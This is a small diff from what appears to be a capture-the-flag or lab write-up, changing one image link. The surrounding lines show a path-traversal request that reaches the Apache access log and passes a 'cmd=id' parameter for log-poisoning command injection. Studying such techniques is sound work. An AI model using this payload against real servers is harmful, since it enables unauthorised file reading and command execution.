@@ -157,7 +157,7 @@ Step 2: Try accessing:
 /?view=dog../../../../var/log/apache2/access.log&ext=&cmd=id
 ```
 
-![Uploading image 6.png…]()
+![image 6](https://github.com/user-attachments/assets/6eb94531-d833-40b4-a4f7-808fadd0a6ff)
 
 Now, we can inject our command there.
 
